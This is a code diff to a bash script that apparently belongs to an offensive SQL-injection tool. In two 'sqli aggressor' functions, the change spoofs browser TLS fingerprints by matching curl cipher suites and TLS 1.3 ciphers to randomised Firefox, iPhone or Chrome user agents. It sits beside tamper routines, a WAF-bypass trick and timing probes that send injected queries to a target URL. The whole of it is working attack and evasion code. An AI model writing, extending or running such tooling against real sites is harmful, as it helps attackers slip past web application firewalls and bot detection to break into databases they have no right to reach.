@@ -136,9 +136,27 @@ vector_sqli_agressor_left() {
         local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
         local random_ua="$base_ua"
         local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-        
-        random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+       
+local target_cipher=""
+        local target_tls13=""
 
+        if [[ "$base_ua" == *"Firefox"* ]]; then
+           
+            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
+
+        elif [[ "$base_ua" == *"iPhone"* ]]; then
+            random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
+
+        else
+
+            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+        fi
         local defiance_tamper_path=""
         local final_query=""
         local raw_payload="$query_payload"
@@ -163,7 +181,7 @@ local t4=$(space2comment_engine "$t2")
 
         local waf_trick=$(braindamage)
         echo -e "\e[0;34m[\e[0m<\e[0;34m]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
-local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
+local curl_output=$(curl $proxy_flag $waf_trick --http2 --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
@@ -198,8 +216,24 @@ vector_sqli_agressor_right() {
         local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
         local random_ua="$base_ua"
         local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-        
-        random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+        local target_cipher=""
+        local target_tls13=""
+
+        if [[ "$base_ua" == *"Firefox"* ]]; then
+            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
+
+        elif [[ "$base_ua" == *"iPhone"* ]]; then
+            random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
+
+        else
+            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
+            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+        fi
 
         local defiance_tamper_path=""
         local final_query=""
@@ -225,7 +259,7 @@ local t4=$(space2comment_engine "$t2")
         
         echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
-local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
+local curl_output=$(curl $proxy_flag $waf_trick --http2 --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
 
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
